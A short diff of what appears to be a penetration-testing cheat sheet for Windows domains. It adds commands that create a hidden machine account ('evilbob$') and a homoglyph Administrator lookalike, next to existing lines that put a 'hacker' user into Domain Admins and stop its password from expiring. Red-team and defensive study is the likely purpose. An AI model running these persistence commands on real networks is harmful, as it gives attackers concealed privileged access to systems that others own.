@@ -36,10 +36,18 @@ net group "Domain Admins" hacker /add /domain
 
 # enable a domain user account
 net user hacker /ACTIVE:YES /domain
+
 # prevent users from changing their password
-net user username  /Passwordchg:No
+net user username /Passwordchg:No
+
 # prevent the password to expire
 net user hacker /Expires:Never
+
+# create a machine account (not shown in net users)
+net user /add evilbob$ evilpassword
+
+# homoglyph Aԁmіnistratοr (different of Administrator)
+Aԁmіnistratοr
 ```
 
 Some info about your user
